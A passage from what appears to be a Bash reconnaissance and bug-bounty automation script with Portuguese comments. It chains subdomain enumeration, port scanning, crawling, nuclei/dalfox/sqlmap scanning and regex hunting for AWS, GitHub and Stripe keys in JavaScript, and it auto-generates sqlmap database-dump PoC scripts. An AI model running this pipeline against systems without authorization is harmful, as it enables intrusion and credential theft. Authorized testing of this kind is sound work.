        timeout 10m subfinder -dL raw/scope.clean.txt -silent -o raw/subfinder.txt 2>/dev/null || true &
    fi
    
    # Amass (passive)
    if command -v amass >/dev/null 2>&1; then
        log_info "Executando amass (passive)..."
        timeout 15m amass enum -passive -df raw/scope.clean.txt -o raw/amass.txt 2>/dev/null || true &
    fi
    
    # Findomain
    if command -v findomain >/dev/null 2>&1; then
        log_info "Executando findomain..."
        timeout 5m findomain -tL raw/scope.clean.txt -u raw/findomain.txt 2>/dev/null || true &
    fi
    
    # Chaos (se disponível)
    if [[ -n "$CHAOS_KEY" ]] && command -v chaos >/dev/null 2>&1; then
        log_info "Executando chaos..."
        timeout 10m chaos -l raw/scope.clean.txt -o raw/chaos.txt 2>/dev/null || true &
    fi
    
    # crt.sh via curl
    log_info "Consultando crt.sh..."
    while read -r domain; do
        curl -s "https://crt.sh/?q=%.${domain}&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | \
        sed 's/\*\.//g' | sort -u >> raw/crtsh.txt || true &
    done < raw/scope.clean.txt
    
    wait  # Esperar todos terminarem
    
    # Juntar e limpar duplicados
    cat raw/*.txt 2>/dev/null \
      | sed 's/^\s*//; s/\s*$//' \
      | grep -Eo "([a-zA-Z0-9][a-zA-Z0-9\.-]+\.[a-zA-Z]{2,})" \
      | sort -u > subs/all_subs.txt
}

subdomain_enumeration

SUBS_FOUND=$(safe_count subs/all_subs.txt)
log_info "Subdomínios encontrados: $SUBS_FOUND"

# Verificar se temos subdomínios
if [[ ! -s subs/all_subs.txt ]]; then
    log_error "Nenhum subdomínio encontrado!"
    cp raw/scope.clean.txt subs/all_subs.txt
    SUBS_FOUND=$(safe_count subs/all_subs.txt)
fi

send_telegram_status "✅ *FASE 1 COMPLETA*
🌐 $SUBS_FOUND subdomínios encontrados
📊 Expansão: $(echo "scale=2; $SUBS_FOUND / $TOTAL_DOMAINS" | bc 2>/dev/null || echo "N/A")x"

# ============= FASE 2: DETECÇÃO DE HOSTS VIVOS MELHORADA =============
echo ""
echo "========== FASE 2: DETECÇÃO DE HOSTS VIVOS & TECNOLOGIAS =========="
send_telegram_status "🔍 *FASE 2: LIVE HOST DETECTION*
Testando $SUBS_FOUND hosts com httpx..."

live_host_detection() {
    log_info "Executando httpx para detectar hosts vivos e tecnologias..."
    
    if command -v httpx >/dev/null 2>&1 && [[ -s subs/all_subs.txt ]]; then
        # Verificar suporte a flags
        if httpx --help 2>/dev/null | grep -q '\-rate-limit'; then
            HTTPX_FLAGS="-rate-limit $RATE_LIMIT"
        else
            HTTPX_FLAGS=""
        fi
        
        httpx -l subs/all_subs.txt -silent -threads "$CONCURRENCY" $HTTPX_FLAGS \
              -tech-detect -status-code -title -ip \
              -o alive/httpx_results.txt 2>/dev/null || true
        
        # Saída JSON também
        httpx -l subs/all_subs.txt -silent -json -threads "$CONCURRENCY" $HTTPX_FLAGS \
              -tech-detect -o alive/httpx.json 2>/dev/null || true
        
        # Processar resultados
        if [[ -s alive/httpx_results.txt ]]; then
            awk '{print $1}' alive/httpx_results.txt | sed 's/,$//' | sort -u > alive/hosts.txt || true
            cat alive/hosts.txt | sed -E 's@https?://@@' | sed 's@/.*@@' | sort -u > alive/hosts_only.txt || true
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    live_host_detection
else
    log_info "DRY-RUN: Pulando detecção de hosts vivos"
    # Criar arquivos mock no modo dry-run
    head -10 subs/all_subs.txt > alive/hosts_only.txt
    sed 's/^/https:\/\//' alive/hosts_only.txt > alive/hosts.txt
fi

LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
log_info "Live hosts: $LIVE_HOSTS"

# Verificar se temos hosts vivos  
if [[ ! -s alive/hosts_only.txt ]]; then
    log_error "Nenhum host vivo encontrado! Continuando com escopo original..."
    cp raw/scope.clean.txt alive/hosts_only.txt
    sed 's/^/https:\/\//' raw/scope.clean.txt > alive/hosts.txt
    LIVE_HOSTS=$(safe_count alive/hosts_only.txt)
fi

send_telegram_status "✅ *FASE 2 COMPLETA*
✅ $LIVE_HOSTS hosts ativos
📊 Taxa de sucesso: $(echo "scale=1; $LIVE_HOSTS * 100 / $SUBS_FOUND" | bc 2>/dev/null || echo "N/A")%"

# ============= FASE 3: SCANNING DE PORTAS CONTROLADO =============
echo ""
echo "========== FASE 3: PORT SCANNING =========="
send_telegram_status "🔍 *FASE 3: PORT SCANNING*
Escaneando portas em $LIVE_HOSTS hosts..."

port_scanning() {
    if command -v naabu >/dev/null 2>&1 && [[ -s alive/hosts_only.txt ]]; then
        log_info "Executando naabu (top ports)"
        
        # Verificar suporte a flags de rate limiting
        if naabu --help 2>/dev/null | grep -q '\-rate'; then
            NAABU_FLAGS="-rate $RATE_LIMIT"
        else
            NAABU_FLAGS=""
        fi
        
        timeout "$TIMEOUT_PER_HOST" naabu -list alive/hosts_only.txt -top-ports 1000 $NAABU_FLAGS \
                -o ports/naabu_raw.txt 2>/dev/null || true
        
        if [[ -s ports/naabu_raw.txt ]]; then
            sort -u ports/naabu_raw.txt > ports/naabu.txt || true
            awk -F":" '{print $1}' ports/naabu.txt | sort -u > ports/hosts_with_ports.txt || true
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    port_scanning
else
    log_info "DRY-RUN: Pulando port scanning"
    touch ports/naabu.txt ports/hosts_with_ports.txt
fi

PORTS_FOUND=$(safe_count ports/naabu.txt)
HOSTS_WITH_PORTS=$(safe_count ports/hosts_with_ports.txt)

send_telegram_status "✅ *FASE 3 COMPLETA*
🚪 $PORTS_FOUND portas abertas
🏠 $HOSTS_WITH_PORTS hosts com portas"


# ============= GETJS COLLECTION IMPLEMENTADA COM DETECÇÃO MELHORADA =============
# Função detect_getjs() movida para o topo do script (antes de check_tools)

getjs_collection() {
    local getjs_bin
    getjs_bin="$(detect_getjs)"

    if [[ -n "$getjs_bin" ]] && [[ -s alive/hosts.txt ]]; then
        # Verificar suporte às flags (precisamos de -url)
        if "$getjs_bin" -h 2>&1 | grep -q '\-url'; then
            log_info "Executando getJS ($getjs_bin) para extrair fontes JS..."
            mkdir -p js/getjs logs

            local processed=0
            local max_hosts=20

            head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
                processed=$((processed + 1))
                safe=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
                log_info "[getJS $processed/$max_hosts] Processando: $url"

                tmp_err="$(mktemp)"
                if timeout 120s "$getjs_bin" \
                    -complete \
                    -threads 3 \
                    -timeout 30s \
                    -output "js/getjs/getjs_${safe}.txt" \
                    -url "$url" 2>"$tmp_err"; then
                    if [[ -s "js/getjs/getjs_${safe}.txt" ]]; then
                        grep -E "\.js(\?|$)" "js/getjs/getjs_${safe}.txt" 2>/dev/null >> js/js_urls_getjs.txt || true
                    fi
                else
                    echo "[$(date '+%H:%M:%S')] getJS error url=$url exit=$? $(tail -n 2 "$tmp_err" | tr '\n' ' ')" >> logs/getjs_errors.log
                    rm -f "js/getjs/getjs_${safe}.txt" 2>/dev/null || true
                fi
                rm -f "$tmp_err" 2>/dev/null || true
            done

            if [[ -s js/js_urls_getjs.txt ]]; then
                # Mesclar e deduplicar com outras fontes
                if [[ -s js/js_urls_raw.txt ]]; then
                    cat js/js_urls_getjs.txt >> js/js_urls_raw.txt
                else
                    cp js/js_urls_getjs.txt js/js_urls_raw.txt
                fi
                sort -u js/js_urls_raw.txt -o js/js_urls_raw.txt
            fi

            log_info "getJS collection finalizada."
        else
            log_info "getJS detectado, mas flags não suportadas (sem '-url'); pulando com fallback."
        fi
    else
        log_info "getJS não disponível ou nenhum host para processar."
        : > js/js_urls_getjs.txt
    fi
}

# ============= FASE 4: CRAWLING E COLETA DE URLs APRIMORADA =============
echo ""
echo "========== FASE 4: CRAWLING & URL COLLECTION =========="
send_telegram_status "🕷️ *FASE 4: URL CRAWLING*
Coletando URLs com múltiplas ferramentas..."

url_collection() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_error "Nenhum host vivo para fazer crawling!"
        touch urls/all_urls_raw.txt urls/with_params.txt js/js_urls_raw.txt
        return
    fi
    
    # GAU
    if command -v gau >/dev/null 2>&1; then
        log_info "Executando gau..."
        mkdir -p urls/gau
        cat alive/hosts_only.txt | head -20 | \
        xargs -P "$PARALLEL_HOSTS" -I{} bash -c 'domain="{}"; timeout 60s gau "$domain" 2>/dev/null || true' > urls/gau.txt || true
    fi
    
    # Waybackurls
    if command -v waybackurls >/dev/null 2>&1; then
        log_info "Executando waybackurls..."
        timeout 10m cat alive/hosts_only.txt | head -10 | while read host; do
            echo "$host" | timeout 30s waybackurls 2>/dev/null || true
        done > urls/wayback.txt || true
    fi
    
    # Hakrawler
    if command -v hakrawler >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando hakrawler..."
        cat alive/hosts.txt | head -10 | \
        xargs -P "$PARALLEL_HOSTS" -I{} bash -c 'timeout 45s echo {} | hakrawler -d '"$MAX_CRAWL_DEPTH"' -subs -t 10 2>/dev/null || true' >> urls/hakrawler.txt || true
    fi
    
    # Katana
    if command -v katana >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando katana..."
        mkdir -p urls/katana
        cat alive/hosts.txt | head -5 | while read -r host; do
            safe=$(echo "$host" | sed 's/[^a-zA-Z0-9]/_/g')
            timeout 60s katana -u "$host" -o "urls/katana/katana_${safe}.txt" -silent 2>/dev/null || true
        done
        cat urls/katana/*.txt 2>/dev/null >> urls/katana.txt || true
    fi
    
    # Gospider (se disponível)
    if command -v gospider >/dev/null 2>&1 && [[ -s alive/hosts.txt ]]; then
        log_info "Executando gospider..."
        cat alive/hosts.txt | head -5 | \
        xargs -P "$PARALLEL_HOSTS" -I{} timeout 60s gospider -s {} -d "$MAX_CRAWL_DEPTH" -c 10 -t 20 2>/dev/null | \
        grep -Eo 'https?://[^[:space:]]+' >> urls/gospider.txt || true
    fi
}

url_collection

# Merge e limpar URLs coletadas
cat urls/*.txt 2>/dev/null | grep -E "https?://" | sort -u > urls/all_urls_raw.txt || true

# Extrair URLs parametrizadas
grep -E "\?" urls/all_urls_raw.txt | sort -u > urls/with_params.txt || true

# Extrair arquivos JS
grep -E "\.js(\?|$)" urls/all_urls_raw.txt | sed -E 's#\?.*##' | sort -u > js/js_urls_raw.txt || true

# Extrair endpoints de API
grep -Ei "/api/|/graphql|/v[0-9]+/|\.json|\.asmx" urls/all_urls_raw.txt > apis/api_endpoints.txt 2>/dev/null || true

# Integrar getJS (se disponível) antes de contar/relatar
getjs_collection

TOTAL_URLS=$(safe_count urls/all_urls_raw.txt)
PARAM_URLS=$(safe_count urls/with_params.txt)
JS_FILES=$(safe_count js/js_urls_raw.txt)
API_ENDPOINTS=$(safe_count apis/api_endpoints.txt)

send_telegram_status "✅ *FASE 4 COMPLETA*
🔗 $TOTAL_URLS URLs coletadas
🎯 $PARAM_URLS com parâmetros
📜 $JS_FILES arquivos JavaScript
🔌 $API_ENDPOINTS endpoints de API"

# ============= DOWNLOAD DE ARQUIVOS JS CORRIGIDO =============
download_js_files() {
    if [[ "$SAVE_JS" = true ]] && [[ -s js/js_urls_raw.txt ]]; then
        log_info "Baixando arquivos JS com timeout e fallback..."

        mkdir -p js/downloads logs
        : > logs/js_download_errors.log
        local downloaded=0
        local max_files="${MAX_JS_FILES}"
        local timeout_per_file="${TIMEOUT_PER_CALL}"

        # Detectar downloaders disponíveis (ordem de preferência: aria2c, wget, curl)
        local candidates=()
        if command -v aria2c >/dev/null 2>&1; then candidates+=("aria2c"); fi
        if command -v wget >/dev/null 2>&1; then candidates+=("wget"); fi
        if command -v curl >/dev/null 2>&1; then candidates+=("curl"); fi
        if [[ ${#candidates[@]} -eq 0 ]]; then
            log_error "Nenhum downloader disponível (aria2c/wget/curl)"
            return 1
        fi

        log_info "Downloaders disponíveis: ${candidates[*]} (ordem de fallback)"

        while IFS= read -r line || [[ -n "$line" ]]; do
            [[ $downloaded -ge $max_files ]] && break
            # Sanitizar URL (remover CR e espaços)
            js_url="${line//$'\r'/}"
            js_url="$(echo "$js_url" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
            [[ -z "$js_url" ]] && continue

            # Nome seguro para arquivo
            safe_name=$(echo "$js_url" | sed 's/[^a-zA-Z0-9._-]/_/g' | cut -c1-80)
            outfile="js/downloads/js_${downloaded}_${safe_name}.js"

            log_info "[JS $((downloaded+1))/$max_files] Baixando: $js_url"

            local success=false
            for dl in "${candidates[@]}"; do
                tmp_err="$(mktemp)"
                case "$dl" in
                    aria2c)
                        if timeout "$timeout_per_file" aria2c -x 1 -s 1 --max-connection-per-server=1 --timeout=25 -q -o "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                    wget)
                        if timeout "$timeout_per_file" wget --timeout=25 --tries=1 --user-agent="$USER_AGENT" -q -O "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                    curl)
                        if timeout "$timeout_per_file" curl -sS -L -f -m 25 --connect-timeout 10 -A "$USER_AGENT" -o "$outfile" "$js_url" 2>"$tmp_err"; then
                            exit_code=0
                        else
                            exit_code=$?
                        fi
                        ;;
                esac
                if [[ $exit_code -eq 0 && -s "$outfile" ]]; then
                    success=true
                    rm -f "$tmp_err"
                    break
                else
                    err_snip="$(tail -n 2 "$tmp_err" | tr '\n' ' ')"
                    echo "[$(date '+%H:%M:%S')] downloader=$dl url=$js_url exit=$exit_code error=${err_snip}" >> logs/js_download_errors.log
                    rm -f "$outfile" 2>/dev/null || true
                    rm -f "$tmp_err"
                fi
            done

            if [[ "$success" = true ]]; then
                downloaded=$((downloaded + 1))
            fi

            # Pequena pausa para evitar sobrecarga
            sleep 0.1
        done < js/js_urls_raw.txt

        # Contar arquivos baixados com sucesso (não vazios)
        JS_DOWNLOADED=$(find js/downloads -type f -name "*.js" -size +0c 2>/dev/null | wc -l | tr -d ' ')
        total_files=$(find js/downloads -type f -name "*.js" 2>/dev/null | wc -l | tr -d ' ')
        
        # Limpar arquivos vazios
        find js/downloads -type f -empty -delete 2>/dev/null || true
        
        log_info "Download completo: $JS_DOWNLOADED/$total_files arquivos JS válidos"
        
        # Log de estatísticas
        if [[ -s logs/js_download_errors.log ]]; then
            errors=$(wc -l < logs/js_download_errors.log)
            log_info "Erros de download: $errors (veja logs/js_download_errors.log)"
        fi
    fi
}

if [[ "$DRY_RUN" = "false" ]]; then
    download_js_files
else
    log_info "DRY-RUN: Pulando download de arquivos JS"
    JS_DOWNLOADED=0
fi

echo "========== FASE 5: VULNERABILITY SCANNING =========="
send_telegram_status "🎯 *NUCLEI VULNERABILITY SCAN*  
Iniciando varredura de vulnerabilidades..."

# Função nuclei_scanning
nuclei_scanning() {
  if ! command -v nuclei >/dev/null 2>&1; then
    log_info "nuclei não encontrado — pulando etapa de varredura"
    return
  fi

  build_nuclei_args NUCLEI_ARGS
  NUCLEI_ARGS_EXT=("${NUCLEI_ARGS[@]}")

  log_info "Executando nuclei FAST mode (vulnerabilidades críticas)..."

  if [[ -s alive/hosts.txt ]]; then
    timeout 1h head -50 alive/hosts.txt | nuclei "${NUCLEI_ARGS[@]}" \
      -tags cves,exposures,tokens,takeovers,default-logins \
      -severity critical,high \
      -o nuclei/nuclei_hosts_fast.txt 2>/dev/null || true
  fi

  if [[ -s urls/all_urls_raw.txt ]]; then
    timeout 1h head -100 urls/all_urls_raw.txt | nuclei "${NUCLEI_ARGS[@]}" \
      -tags cves,exposures,tokens,takeovers,default-logins \
      -severity critical,high \
      -o nuclei/nuclei_urls_fast.txt 2>/dev/null || true
  fi

  log_info "Executando nuclei EXTENDED mode (riscos médios)..."
  if [[ -s alive/hosts.txt ]]; then
    timeout 2h head -30 alive/hosts.txt | nuclei "${NUCLEI_ARGS_EXT[@]}" \
      -tags misconfig,panels,default-logins,exposures \
      -severity high,critical,medium \
      -o nuclei/nuclei_hosts_ext.txt 2>/dev/null || true
  fi
}

# Função xss_testing
xss_testing() {
    if command -v dalfox >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
        log_info "Executando dalfox XSS testing..."
        
        timeout 30m cat urls/with_params.txt | head -50 | dalfox pipe \
          -w $((CONCURRENCY / 2)) \
          --timeout 10 \
          --skip-bav \
          --silence \
          -o nuclei/dalfox_results.txt 2>/dev/null || true
    fi
}

# Função sqlmap_testing
sqlmap_testing() {
    if command -v sqlmap >/dev/null 2>&1 && [[ -s urls/with_params.txt ]]; then
        log_info "Iniciando SQLMap testing com controles de segurança..."
        send_telegram_status "💉 *SQL INJECTION TESTING*
Testando URLs para SQLi..."
        
        mkdir -p poc/sqli logs/sqlmap
        
        if command -v gf >/dev/null 2>&1; then
            cat urls/with_params.txt | gf sqli 2>/dev/null > urls/sqli_candidates.txt || true
        else
            grep -Ei "(\?|&)(id|user|search|category|page|item|product)=" urls/with_params.txt > urls/sqli_candidates.txt 2>/dev/null || true
        fi
        
        if [[ ! -s urls/sqli_candidates.txt ]]; then
            head -10 urls/with_params.txt > urls/sqli_candidates.txt
        fi
        
        local candidates=$(safe_count urls/sqli_candidates.txt)
        log_info "Testando $candidates candidatos SQLi com sqlmap..."
        
        local max_urls=10
        [[ "$PROFILE" = "light" ]] && max_urls=5
        [[ "$PROFILE" = "aggressive" ]] && max_urls=20
        
        local current=0
        > urls/sqli_validated.txt
        
        head -n "$max_urls" urls/sqli_candidates.txt | while read -r url && [[ $current -lt $max_urls ]]; do
            current=$((current + 1))
            log_info "[SQLMap $current/$max_urls] Testando: $url"
            
            local url_hash=$(echo "$url" | md5sum | cut -c1-8)
            local log_file="logs/sqlmap/sqlmap_${url_hash}.txt"
            
            timeout 120s sqlmap \
                -u "$url" \
                --batch --level=2 --risk=1 \
                --random-agent --threads=2 \
                --technique=BEUSTQ \
                --no-cast --disable-coloring \
                --answers="follow=N,other=N,crack=N,dict=N,keep=Y" \
                --timeout=45 --retries=1 \
                --output-dir="poc/sqli" \
                > "$log_file" 2>&1 || {
                    echo "[TIMEOUT/ERROR] $url" >> logs/sqlmap/errors.log
                    continue
                }

            if grep -qi "parameter.*is vulnerable\|sqlmap identified the following injection point\|payload.*worked" "$log_file"; then
                echo "$url" >> urls/sqli_validated.txt
                log_info "⚠️  VULNERABILIDADE SQLi ENCONTRADA: $url"
                
                if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
                    send_telegram_message_enhanced "🚨 *SQL INJECTION FOUND!*
💉 URL: \`$url\`
🔍 Verificar: poc/sqli/ e logs/sqlmap/" "true"
                fi
                
                cat > "poc/sqli/exploit_${url_hash}.sh" <<'SQLPOC'
#!/bin/bash
# SQLi exploit para: $url
# Encontrada em: $(date)

echo "=== SQLi Exploitation PoC ==="
echo "Target: $url"
echo ""

echo "1. Listando databases:"
sqlmap -u "$url" --batch --dbs --threads=2

echo ""
echo "2. Para dump de tabelas específicas:"
echo "sqlmap -u '$url' --batch -D DATABASE_NAME --tables"

echo ""
echo "3. CUIDADO: Dump completo (apenas com autorização):"
echo "sqlmap -u '$url' --batch --dump --threads=2"
SQLPOC
                chmod +x "poc/sqli/exploit_${url_hash}.sh"
            fi
        done
        
        local sqli_found=$(safe_count urls/sqli_validated.txt)
        log_info "SQLMap testing completo. Vulnerabilidades encontradas: $sqli_found"
        
        if [[ "$sqli_found" -gt 0 ]]; then
            send_telegram_status "🚨 *SQLi VULNERABILITIES CONFIRMED*
💥 $sqli_found SQL injections encontradas!
📁 PoCs gerados em poc/sqli/
⚠️ REVISÃO MANUAL URGENTE!" true
        else
            send_telegram_status "✅ *SQLi TESTING COMPLETE*
🛡️ Nenhuma vulnerabilidade SQLi confirmada nos candidatos testados"
        fi
    else
        log_info "SQLMap não disponível ou nenhuma URL com parâmetros encontrada"
        touch urls/sqli_candidates.txt urls/sqli_validated.txt
    fi
}

# ============= FASE 5: VULNERABILITY SCANNING =============
echo ""
echo "========== FASE 5: VULNERABILITY SCANNING =========="
send_telegram_status "🎯 *NUCLEI VULNERABILITY SCAN*  
Iniciando varredura de vulnerabilidades..."

if [ "${DRY_RUN:-false}" != "true" ]; then
    nuclei_scanning
    xss_testing
    sqlmap_testing
else
    log_info "DRY-RUN: Pulando vulnerability scanning"
    mkdir -p nuclei
    : > nuclei/nuclei_hosts_fast.txt
    : > nuclei/nuclei_urls_fast.txt
    : > nuclei/nuclei_hosts_ext.txt
    : > nuclei/dalfox_results.txt
fi

# ============= SECRETS HUNTING APRIMORADO =============
echo ""
echo "========== SECRETS HUNTING =========="
send_telegram_status "🔑 *SECRETS HUNTING*
Analisando arquivos JS para secrets..."

secrets_hunting() {
    mkdir -p secrets
    
    if [[ -d js/downloads ]] && [[ "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "Escaneando arquivos JavaScript para secrets..."
        
        grep -IrohE "AKIA[0-9A-Z]{16}" js/downloads/* 2>/dev/null | sort -u > secrets/aws_keys.txt || true
        grep -IrohE "AIza[0-9A-Za-z\\-_]{35}" js/downloads/* 2>/dev/null | sort -u > secrets/google_api_keys.txt || true
        grep -IrohE "firebase[_-]?api[_-]?key[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{20,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/firebase_keys.txt || true
        grep -IrohE "eyJ[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{30,}\.[0-9A-Za-z\-_]{20,}" js/downloads/* 2>/dev/null | sort -u > secrets/jwt_tokens.txt || true
        grep -IrohE "ghp_[0-9A-Za-z]{36}" js/downloads/* 2>/dev/null | sort -u > secrets/github_tokens.txt || true
        grep -IrohE "sk_live_[0-9a-zA-Z]{24}" js/downloads/* 2>/dev/null | sort -u > secrets/stripe_keys.txt || true
        grep -IrohE "(api[_-]?key|apikey|access[_-]?token)[\"']?\s*[:=]\s*[\"'][A-Za-z0-9\-_.]{16,}[\"']" js/downloads/* 2>/dev/null | sort -u > secrets/generic_api_keys.txt || true
        grep -IrohE "(\?|&)(id|user|search|category|page|item|product|login|admin|auth|token|key|sort|filter)=" urls/with_params.txt > urls/sqli_candidates.txt 2>/dev/null || true

        local AWS_SECRETS=$(safe_count secrets/aws_keys.txt)
        local GOOGLE_SECRETS=$(safe_count secrets/google_api_keys.txt)
        local JWT_SECRETS=$(safe_count secrets/jwt_tokens.txt)
        local GITHUB_SECRETS=$(safe_count secrets/github_tokens.txt)
        local STRIPE_SECRETS=$(safe_count secrets/stripe_keys.txt)
        
        local TOTAL_SECRETS=$((AWS_SECRETS + GOOGLE_SECRETS + JWT_SECRETS + GITHUB_SECRETS + STRIPE_SECRETS))
        
        if [[ "$TOTAL_SECRETS" -gt 0 ]]; then
            log_info "⚠️  SECRETS ENCONTRADOS: $TOTAL_SECRETS"
        fi
    else
        log_info "Nenhum arquivo JS encontrado para análise de secrets"
        touch secrets/aws_keys.txt secrets/google_api_keys.txt secrets/jwt_tokens.txt
        TOTAL_SECRETS=0
    fi
}

secrets_hunting

# ============= CLASSIFICAÇÃO GF MELHORADA =============
echo ""
echo "========== GF CLASSIFICATION =========="
send_telegram_status "🔍 *GF CLASSIFICATION*
Classificando URLs por tipo de vulnerabilidade..."

gf_classification() {
    if command -v gf >/dev/null 2>&1 && [[ -s urls/all_urls_raw.txt ]]; then
        log_info "Executando classificação gf contra todas as URLs..."
        
        cat urls/all_urls_raw.txt | gf xss 2>/dev/null | sort -u > urls/gf_xss.txt || true
        cat urls/all_urls_raw.txt | gf sqli 2>/dev/null | sort -u > urls/gf_sqli.txt || true
        cat urls/all_urls_raw.txt | gf lfi 2>/dev/null | sort -u > urls/gf_lfi.txt || true
        cat urls/all_urls_raw.txt | gf ssrf 2>/dev/null | sort -u > urls/gf_ssrf.txt || true
        cat urls/all_urls_raw.txt | gf redirect 2>/dev/null | sort -u > urls/gf_redirect.txt || true
        cat urls/all_urls_raw.txt | gf rce 2>/dev/null | sort -u > urls/gf_rce.txt || true
        
    else
        log_info "gf não disponível ou nenhuma URL para classificar"
        touch urls/gf_xss.txt urls/gf_sqli.txt urls/gf_lfi.txt urls/gf_ssrf.txt urls/gf_redirect.txt urls/gf_rce.txt
    fi
}

gf_classification

XSS_CANDIDATES=$(safe_count urls/gf_xss.txt)
SQLI_CANDIDATES=$(safe_count urls/gf_sqli.txt)
LFI_CANDIDATES=$(safe_count urls/gf_lfi.txt)
SSRF_CANDIDATES=$(safe_count urls/gf_ssrf.txt)

# ============= FASE 6: EXTRA TOOLS EXECUTION =============
echo ""
echo "========== FASE 6: EXTRA TOOLS SCANNING =========="
send_telegram_status "🔧 *FASE 6: EXTRA TOOLS*
Executando ferramentas avançadas de reconhecimento e exploração..."

# ============= FUNÇÃO WRAPPER PARA EXECUÇÃO COM FALLBACK =============
run_tool_safe() {
    local tool_name="$1"
    local tool_command="$2"
    local log_file="logs/extra_tools/${tool_name}.log"
    local error_file="logs/extra_tools/${tool_name}_error.log"
    
    if ! command -v "$tool_name" >/dev/null 2>&1; then
        log_info "⚠️  $tool_name não instalado - pulando..."
        echo "Tool not installed" > "$log_file"
        return 1
    fi
    
    log_info "▶️  Executando $tool_name..."
    
    if eval "$tool_command" > "$log_file" 2> "$error_file"; then
        log_info "✅ $tool_name completo"
        return 0
    else
        log_error "❌ $tool_name falhou - veja $error_file"
        return 1
    fi
}

# ============= KXSS - XSS Detection =============
run_kxss() {
    if [[ ! -s urls/gf_xss.txt ]]; then
        log_info "⚠️  Nenhuma URL XSS candidata encontrada - pulando kxss"
        return 0
    fi
    
    run_tool_safe "kxss" "cat urls/gf_xss.txt | head -100 | kxss | tee reports/kxss/kxss_results.txt"
}

# ============= GXSS - XSS Grep =============
run_gxss() {
    if [[ ! -s urls/all_urls_raw.txt ]]; then
        log_info "⚠️  Nenhuma URL encontrada - pulando gxss"
        return 0
    fi
    
    run_tool_safe "gxss" "cat urls/all_urls_raw.txt | head -200 | gxss | tee reports/gxss/gxss_results.txt"
}

# ============= LINKFINDER - Extract Endpoints from JS =============
run_linkfinder() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo JS baixado - pulando linkfinder"
        return 0
    fi
    
    if command -v linkfinder >/dev/null 2>&1; then
        log_info "▶️  Executando linkfinder em arquivos JS..."
        mkdir -p reports/linkfinder
        
        find js/downloads -type f -name "*.js" | head -50 | while read -r jsfile; do
            safe_name=$(basename "$jsfile" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 30s linkfinder -i "$jsfile" -o cli 2>/dev/null >> reports/linkfinder/endpoints_${safe_name}.txt || true
        done
        
        cat reports/linkfinder/endpoints_*.txt 2>/dev/null | sort -u > reports/linkfinder/all_endpoints.txt || true
        log_info "✅ linkfinder completo"
    fi
}

# ============= XNLINKFINDER - Advanced Link Finder =============
run_xnlinkfinder() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host vivo - pulando xnLinkFinder"
        return 0
    fi
    
    if command -v xnLinkFinder >/dev/null 2>&1; then
        log_info "▶️  Executando xnLinkFinder..."
        mkdir -p reports/xnlinkfinder
        
        head -20 alive/hosts.txt | while read -r url; do
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 60s xnLinkFinder -i "$url" -o reports/xnlinkfinder/links_${safe_name}.txt 2>/dev/null || true
        done
        
        cat reports/xnlinkfinder/links_*.txt 2>/dev/null | sort -u > reports/xnlinkfinder/all_links.txt || true
        log_info "✅ xnLinkFinder completo"
    fi
}

# ============= PARAMSPIDER - Parameter Discovery =============
run_paramspider() {
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando paramspider"
        return 0
    fi
    
    if command -v paramspider >/dev/null 2>&1; then
        log_info "▶️  Executando paramspider..."
        mkdir -p reports/paramspider
        
        head -10 alive/hosts_only.txt | while read -r domain; do
            safe_name=$(echo "$domain" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 180s paramspider -d "$domain" --output reports/paramspider/params_${safe_name}.txt 2>/dev/null || true
        done
        
        cat reports/paramspider/params_*.txt 2>/dev/null | sort -u > reports/paramspider/all_params.txt || true
        log_info "✅ paramspider completo"
    fi
}

# ============= ARJUN - Parameter Bruteforce =============
run_arjun() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando arjun"
        return 0
    fi
    
    if command -v arjun >/dev/null 2>&1; then
        log_info "▶️  Executando arjun..."
        mkdir -p reports/arjun
        
        head -5 alive/hosts.txt | while read -r url; do
            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 300s arjun -u "$url" -oJ reports/arjun/params_${safe_name}.json -t "$PARALLEL_HOSTS" 2>/dev/null || true
        done
        
        log_info "✅ arjun completo"
    fi
}

# ============= SECRETFINDER - Find Secrets in JS =============
run_secretfinder() {
    if [[ ! -d js/downloads ]] || [[ ! "$(ls -A js/downloads 2>/dev/null)" ]]; then
        log_info "⚠️  Nenhum arquivo JS - pulando secretfinder"
        return 0
    fi
    
    if command -v SecretFinder >/dev/null 2>&1 || command -v secretfinder >/dev/null 2>&1; then
        log_info "▶️  Executando secretfinder..."
        mkdir -p reports/secretfinder
        
        SECRETFINDER_CMD=$(command -v SecretFinder || command -v secretfinder)
        
        find js/downloads -type f -name "*.js" | head -50 | while read -r jsfile; do
            safe_name=$(basename "$jsfile" | sed 's/[^a-zA-Z0-9._-]/_/g')
            timeout 30s python3 "$SECRETFINDER_CMD" -i "$jsfile" -o cli 2>/dev/null >> reports/secretfinder/secrets_${safe_name}.txt || true
